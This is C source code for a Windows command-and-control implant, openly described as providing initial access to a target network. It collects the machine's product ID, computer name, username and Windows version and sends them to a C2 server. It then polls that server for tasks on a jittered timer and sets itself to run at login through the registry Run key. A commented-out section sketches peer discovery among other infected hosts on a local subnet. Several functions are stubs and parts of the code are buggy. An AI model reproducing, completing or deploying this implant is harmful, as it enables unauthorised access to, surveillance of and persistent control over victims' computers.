/**************************************
 * This exe provides initial access
 * to a target network by establishing
 * persistence and http egress with the
 * linked C2 server
 * ***********************************/

// TODO
// Read environment variables
// List network interfaces
// Get Windows Version
// Retrieve username + token
// Retrieve computer name
// Retrieve machine GUID
// List files in directory
// Change directory
// List running processes

#include <tchar.h>
#include <windows.h>
#include <stdio.h>
#include <winhttp.h>
#include <tlhelp32.h>
#include <dirent.h>
#include <iphlpapi.h>
#include <zmq.h>

// Use iphlpapi to get interface info
void NetworkInterfaces(){

}

// List environment variables
void EnvVariables(){

}

// Print all running processes
void RunningProcesses(){
    HANDLE hSnap;
    PROCESSENTRY32 ProcessStruct;
    ProcessStruct.dwSize = sizeof(PROCESSENTRY32);
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE){
        printf("Snapshot failure: %d\n", GetLastError());
    }
    if(Process32First(hSnap, &ProcessStruct) == FALSE){
        printf("Snapshot failure: %d\n", GetLastError());
    }
    do{
        printf("%s\n", ProcessStruct.szExeFile);
    }while(Process32Next(hSnap, &ProcessStruct));
    CloseHandle(hSnap);
}

// Identify system using product ID
wchar_t* ProductID(){
    wchar_t* value = (wchar_t*)malloc(30*sizeof(wchar_t));
	DWORD size = 30*sizeof(wchar_t);
	RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductId", RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
    return value;
}

// Retrieve computer name
wchar_t* ComputerName(){
    wchar_t* value = (wchar_t*)malloc(30*sizeof(wchar_t));;
	DWORD size = 30*sizeof(char);
	RegGetValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName", "ComputerName", RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
	return value;
}

// Retrieve current user
wchar_t* CurrentUser(){
    wchar_t* value = (wchar_t*)malloc(30*sizeof(wchar_t));;
	DWORD size = 30*sizeof(char);
	RegGetValue(HKEY_CURRENT_USER, "Volatile Environment", "USERNAME", RRF_RT_REG_SZ, NULL, (PVOID)value, &size);
	return value;
}

// Windows release
wchar_t* OSName(){
    wchar_t* name = (wchar_t*)malloc(30*sizeof(wchar_t));
    DWORD size = 30*sizeof(char);
    RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", RRF_RT_REG_SZ, NULL, (PVOID)name, &size);
    return name;
}

// Windows build
wchar_t* OSVersion(){
    wchar_t* build = (wchar_t*)malloc(30*sizeof(wchar_t));
	DWORD size = 30*sizeof(char);
	RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentBuild", RRF_RT_REG_SZ, NULL, (PVOID)build, &size);
    return build;
}

// List files in directory
void ls(char* path){
    // Open context
    DIR *d;
    d = opendir(path);

    struct dirent *de;
    if (d != NULL){
        while ( de = readdir(d)){
            printf("%s\n", de->d_name);
        }
        closedir(d);
    }
}

// Contact C2 and provide basic computer info
void RegisterC2(){

    HINTERNET session = WinHttpOpen(
        L"Diplomat", 
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
        WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 
        0
    );

    if (session)
    {
        HINTERNET connection = WinHttpConnect(
            session, 
            L"127.0.0.1", 
            5000, 
            0
        );
        
        if (connection) {
            HINTERNET request = WinHttpOpenRequest(
                connection,
                L"POST",
                L"/register",
                L"HTTP/1.1",
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                0
            );
            
            if(request){
                wchar_t* headers = L"Content-Type: application/json\r\n";
                char* jsonData = (char*) malloc(512);
                wchar_t* productID = ProductID();
                wchar_t* OSRelease = OSName();
                wchar_t* OSBuild = OSVersion();
                wchar_t* username = CurrentUser();
                wchar_t* computerName = ComputerName();
                sprintf(jsonData, "{ \"ProductID\": \"%s\", \"OSName\": \"%s\", \"OSBuild\": \"%s\", \"Username\": \"%s\", \"ComputerName\": \"%s\" }", productID, OSRelease, OSBuild, username, computerName);
                size_t size = strlen(jsonData) * sizeof(char);

                BOOL result = WinHttpSendRequest(
                    request, 
                    headers,
                    -1,
                    jsonData,
                    size,
                    size,
                    (DWORD_PTR)NULL
                );
                
                if(result){
                    result = WinHttpReceiveResponse(request, NULL);
                }
                DWORD responseSize;
                if(result){
                    result = WinHttpQueryDataAvailable(request, &responseSize);
                }
                if(result){
                    // Handle response
                }
            }else{
                printf("%d\n", GetLastError());
            }
            WinHttpCloseHandle(request);
        }else{
            printf("%d\n", GetLastError());
        }
        WinHttpCloseHandle(connection);
    }else{
        printf("%d\n", GetLastError());
    }
    WinHttpCloseHandle(session);
}

// Contact C2 and get commands to run
wchar_t* GetTasks(){
    HINTERNET session = WinHttpOpen(
        L"Diplomat", 
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
        WINHTTP_NO_PROXY_NAME, 
        WINHTTP_NO_PROXY_BYPASS, 
        0
    );

    if (session)
    {
        HINTERNET connection = WinHttpConnect(
            session, 
            L"127.0.0.1", 
            5000, 
            0
        );
        
        if (connection) {
            wchar_t* buffer = (wchar_t*)malloc(1024);
            wchar_t* pid = ProductID();
            swprintf(buffer, 1024/sizeof(wchar_t), L"/tasks/%s", pid);

            HINTERNET request = WinHttpOpenRequest(
                connection,
                L"GET",
                buffer,
                L"HTTP/1.1",
                WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                0
            );
            
            if(request){
                BOOL result = WinHttpSendRequest(
                    request, 
                    WINHTTP_NO_ADDITIONAL_HEADERS,
                    -1,
                    WINHTTP_NO_REQUEST_DATA,
                    0,
                    0,
                    (DWORD_PTR)NULL
                );
                
                if(result){
                    result = WinHttpReceiveResponse(request, NULL);
                }
                DWORD responseSize;
                if(result){
                    result = WinHttpQueryDataAvailable(request, &responseSize);
                }
                if(result){
                    // Handle response
                    wchar_t* response = (wchar_t*)malloc(1024);
                    LPDWORD bytesRead;
                    if(WinHttpReadData(request, response, responseSize, bytesRead)){
                        return response;
                    }
                }
            }else{
                printf("%d\n", GetLastError());
            }
            WinHttpCloseHandle(request);
        }else{
            printf("%d\n", GetLastError());
        }
        WinHttpCloseHandle(connection);
    }else{
        printf("%d\n", GetLastError());
    }
    WinHttpCloseHandle(session);
}

void PersistMe(){
    HKEY key;
    RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &key);
    wchar_t* buffer = (wchar_t*)malloc(256);
    GetModuleFileNameW(NULL, buffer, 256);
    BYTE* input = (BYTE*)buffer;
    DWORD size = wcslen(buffer) * sizeof(buffer[0]);
    RegSetValueExW(key, L"Internet", 0, REG_SZ, input, size);
    RegCloseKey(key);
}

int _tmain(int argc, _TCHAR *argv[]){

    if(argc == 1){
        // Report intrusion to C2
        RegisterC2();
        PersistMe();
        // Periodically check for new commands from C2
        while(1){
            wchar_t* tasks = GetTasks();
            wprintf(L"%s\n", tasks);

            int jitter = (rand() % 20000) - 10000;
            Sleep(30000+jitter);
        }
    }

    /*

    // Establish peer network
    // Create a router for recieving messages
    void* context = zmq_ctx_new();
    void* router = zmq_socket(context, ZMQ_ROUTER);
    int success = zmq_bind(router, "tcp://*:8889");
    if (success != 0){

    }

    // Scan network for other infected machines
    // Brute force method
    void* dealer = zmq_socket(context, ZMQ_DEALER);
    for(int address = 1; address < 255; address++){
        zmq_connect(dealer, "tcp://192.168.56.%d:8889", address);
    }


    // Timed loop for checking potential peers and retrieving commands from c2
    while(1){
        // Read router activity
        _TCHAR* buffer = malloc(64*sizeof(char));
        zmq_recv(router, buffer, 64, 0);
        printf("Incoming message: %s", buffer);
        Sleep(10000);
        zmq_send(dealer, buffer, 64, 0);
    }

    */
}